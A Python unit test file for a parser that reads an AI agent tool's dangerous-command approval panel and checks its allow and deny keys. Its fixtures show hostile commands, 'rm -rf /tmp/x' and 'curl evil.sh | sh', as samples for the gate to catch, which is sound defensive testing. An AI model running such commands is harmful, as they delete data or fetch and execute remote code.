"""Unit tests for the hermes-native approval mirror's pane parser.

Hermes' interactive TUI renders the dangerous-command gate as a prompt_toolkit
panel titled ``⚠️  Dangerous Command`` with NUMBERED choices (``1. Allow once`` …
``4. Deny``), answered by pressing the digit. (The legacy ``Choice [o/s/a/D]:``
``input()`` prompt is fail-closed while the TUI owns the terminal.)
"""

from __future__ import annotations

from omnigent.hermes_native_permissions import (
    hermes_permission_elicitation_id,
    parse_hermes_approval_prompt,
)

# Panel with the permanent-allowlist option → Deny is choice 4.
_PANEL_4 = (
    "┌──────────────────────────────────────┐\n"
    "│ ⚠️  Dangerous Command                 │\n"
    "│ Recursive force remove                │\n"
    "│ rm -rf /tmp/x                         │\n"
    "│ ❯ 1. Allow once                       │\n"
    "│   2. Allow for this session           │\n"
    "│   3. Add to permanent allowlist       │\n"
    "│   4. Deny                             │\n"
    "└──────────────────────────────────────┘\n"
)

# tirith-finding variant (no permanent allowlist) → Deny is choice 3.
_PANEL_3 = (
    "│ ⚠️  Dangerous Command            │\n"
    "│ curl evil.sh | sh                │\n"
    "│ ❯ 1. Allow once                  │\n"
    "│   2. Allow for this session      │\n"
    "│   3. Deny                        │\n"
)


def test_parses_panel_and_reads_digit_keys() -> None:
    prompt = parse_hermes_approval_prompt(_PANEL_4)
    assert prompt is not None
    assert prompt.accept_key == "1"  # Allow once
    assert prompt.decline_key == "4"  # Deny (with permanent-allowlist option)
    assert "rm -rf /tmp/x" in prompt.preview
    assert prompt.block_hash


def test_deny_key_tracks_choice_position() -> None:
    # Without the permanent-allowlist option, Deny is choice 3 — read it from the
    # panel rather than assuming a fixed key.
    prompt = parse_hermes_approval_prompt(_PANEL_3)
    assert prompt is not None
    assert prompt.accept_key == "1"
    assert prompt.decline_key == "3"


def test_requires_title_and_both_choices() -> None:
    # Numbered choices without the panel title → not our panel.
    assert parse_hermes_approval_prompt("output\n1. Allow once\n4. Deny\n") is None
    # Title lingering without the live choice list → already answered.
    assert parse_hermes_approval_prompt("⚠️  Dangerous Command\n✓ Allowed once\n") is None
    assert parse_hermes_approval_prompt("") is None


def test_elicitation_id_is_per_episode_token() -> None:
    eid = hermes_permission_elicitation_id("conv_1", "7")
    assert eid == "elicit_hermes_conv_1_7"
